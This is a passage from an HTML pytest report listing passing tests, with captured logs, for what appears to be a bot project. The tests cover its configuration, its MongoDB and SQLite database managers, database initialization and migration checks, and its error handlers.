          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] Processing unknown command
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_commands.py::TestCommandHandler::test_create_response</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_commands.py::TestCommandHandler::test_create_response_with_custom_params</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_bot_token</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_bot_token_missing</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_webhook_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_logging_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_validate_config_valid_token</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_validate_config_invalid_token</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_validate_config_missing_token</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_validate_config_valid_webhook</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_validate_config_invalid_webhook_url</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_config_caching</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_database_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_database_config_with_defaults</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_database_config_missing_uri</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_redis_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_redis_config_without_password</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_config.py::TestConfigManager::test_get_redis_config_missing_url</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] DatabaseManager initialized
2025-09-20 23:09:45 [info     ] DatabaseManager initialized
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_connect_all_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] DatabaseManager initialized
2025-09-20 23:09:45 [info     ] Initializing connections to all databases
2025-09-20 23:09:45 [info     ] Connecting to MongoDB at mongodb://localhost:27017/test
2025-09-20 23:09:45 [info     ] Successfully connected to MongoDB
2025-09-20 23:09:45 [info     ] Connecting to SQLite database at /tmp/test.db
2025-09-20 23:09:45 [info     ] Successfully connected to SQLite database
2025-09-20 23:09:45 [info     ] Successfully connected to available databases
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_connect_all_mongo_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] DatabaseManager initialized
2025-09-20 23:09:45 [info     ] Initializing connections to all databases
2025-09-20 23:09:45 [info     ] Connecting to MongoDB at mongodb://localhost:27017/test
2025-09-20 23:09:45 [error    ] Unexpected error connecting to MongoDB: Connection failed
2025-09-20 23:09:45 [warning  ] Failed to connect to MongoDB, continuing without it
2025-09-20 23:09:45 [info     ] Connecting to SQLite database at /tmp/test.db
2025-09-20 23:09:45 [info     ] Successfully connected to SQLite database
2025-09-20 23:09:45 [info     ] Successfully connected to available databases
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_connect_all_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] DatabaseManager initialized
2025-09-20 23:09:45 [info     ] Initializing connections to all databases
2025-09-20 23:09:45 [info     ] Connecting to MongoDB at mongodb://localhost:27017/test
2025-09-20 23:09:45 [info     ] Successfully connected to MongoDB
2025-09-20 23:09:45 [info     ] Connecting to SQLite database at /tmp/test.db
2025-09-20 23:09:45 [error    ] Error connecting to SQLite database: Connection failed
2025-09-20 23:09:45 [warning  ] Failed to connect to SQLite, continuing without it
2025-09-20 23:09:45 [info     ] Successfully connected to available databases
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_get_mongo_db</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] DatabaseManager initialized
2025-09-20 23:09:45 [info     ] Initializing connections to all databases
2025-09-20 23:09:45 [info     ] Connecting to MongoDB at mongodb://localhost:27017/test
2025-09-20 23:09:45 [info     ] Successfully connected to MongoDB
2025-09-20 23:09:45 [info     ] Connecting to SQLite database at /tmp/test.db
2025-09-20 23:09:45 [info     ] Successfully connected to SQLite database
2025-09-20 23:09:45 [info     ] Successfully connected to available databases
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_get_mongo_db_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] DatabaseManager initialized
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_get_sqlite_conn</td>
          <td class="col-duration">40.10</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] DatabaseManager initialized
2025-09-20 23:09:45 [info     ] Initializing connections to all databases
2025-09-20 23:09:45 [info     ] Connecting to MongoDB at mongodb://localhost:27017/test
2025-09-20 23:09:50 [warning  ] MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf343988ed7674ef4ee919, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
2025-09-20 23:09:50 [info     ] Retrying in 1 seconds...
2025-09-20 23:09:56 [warning  ] MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf343f88ed7674ef4ee91a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
2025-09-20 23:09:56 [info     ] Retrying in 2 seconds...
2025-09-20 23:10:04 [warning  ] MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf344688ed7674ef4ee91b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
2025-09-20 23:10:04 [info     ] Retrying in 4 seconds...
2025-09-20 23:10:13 [warning  ] MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf345088ed7674ef4ee91c, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
2025-09-20 23:10:13 [info     ] Retrying in 8 seconds...
2025-09-20 23:10:26 [warning  ] MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf345d88ed7674ef4ee91d, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
2025-09-20 23:10:26 [error    ] Max retries exceeded for MongoDB connection
2025-09-20 23:10:26 [warning  ] Failed to connect to MongoDB, continuing without it
2025-09-20 23:10:26 [info     ] Connecting to SQLite database at /tmp/test.db
2025-09-20 23:10:26 [info     ] Successfully connected to SQLite database
2025-09-20 23:10:26 [info     ] Successfully connected to available databases
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_get_sqlite_conn_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseManager initialized
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseManager initialized
2025-09-20 23:10:26 [info     ] Initializing connections to all databases
2025-09-20 23:10:26 [info     ] Connecting to MongoDB at mongodb://localhost:27017/test
2025-09-20 23:10:26 [info     ] Successfully connected to MongoDB
2025-09-20 23:10:26 [info     ] Connecting to SQLite database at /tmp/test.db
2025-09-20 23:10:26 [info     ] Successfully connected to SQLite database
2025-09-20 23:10:26 [info     ] Successfully connected to available databases
2025-09-20 23:10:26 [debug    ] Performing database health check
2025-09-20 23:10:26 [debug    ] Database health check results: {&#x27;mongodb&#x27;: True, &#x27;sqlite&#x27;: True}
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_database_initializer_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_initialize_databases_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [info     ] Starting database initialization with migration detection
2025-09-20 23:10:26 [info     ] Database initialization completed successfully
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_initialize_databases_mongo_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [info     ] Starting database initialization with migration detection
2025-09-20 23:10:26 [error    ] Failed to initialize MongoDB
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_initialize_databases_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [info     ] Starting database initialization with migration detection
2025-09-20 23:10:26 [error    ] Failed to initialize SQLite
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_detect_migrations</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [info     ] Detecting existing migrations
2025-09-20 23:10:26 [info     ] Migration detection completed: {&#x27;sqlite_version&#x27;: &#x27;1.0&#x27;, &#x27;mongodb_version&#x27;: &#x27;1.0&#x27;, &#x27;requires_migration&#x27;: False, &#x27;existing_data&#x27;: False}
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_check_sqlite_migration_status</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [debug    ] Checking SQLite migration status
2025-09-20 23:10:26 [debug    ] SQLite migration status: {&#x27;sqlite_version&#x27;: &#x27;1.0&#x27;, &#x27;existing_data&#x27;: False}
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_check_mongodb_migration_status</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [debug    ] Checking MongoDB migration status
2025-09-20 23:10:26 [debug    ] MongoDB migration status: {&#x27;mongodb_version&#x27;: &#x27;1.0&#x27;, &#x27;existing_data&#x27;: False}
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_initialize_mongodb</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [info     ] Initializing MongoDB collections
2025-09-20 23:10:26 [info     ] MongoDB collections initialized successfully
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_initialize_sqlite</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
2025-09-20 23:10:26 [info     ] Initializing SQLite tables
2025-09-20 23:10:26 [info     ] SQLite tables initialized successfully
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_init.py::test_convenience_function</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:10:26 [info     ] DatabaseInitializer initialized
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_connect_all</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_get_mongo_db_when_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_get_mongo_db_when_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_get_sqlite_conn_when_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_get_sqlite_conn_when_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestMockDatabaseManager::test_close_all</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestConfig::test_create_test_config_manager</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestConfig::test_set_test_env_vars</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestConfig::test_restore_env_vars</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestDataFactory::test_create_test_user_data</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestDataFactory::test_create_test_subscription_data</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestDataFactory::test_create_test_narrative_fragment</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestHelpers::test_create_temp_database_path</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::TestDatabaseTestContext::test_context_manager</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::test_mock_database_manager_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::test_database_test_config_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::test_database_test_data_factory_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::test_database_test_helpers_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_database_test_utils.py::test_temp_database_path_fixture</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_event_publish_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_event_subscribe_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_event_bus_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_error_handler_enhanced.py::TestErrorHandler::test_handle_user_service_error</td>
          <td class="col-duration">0.00</td>
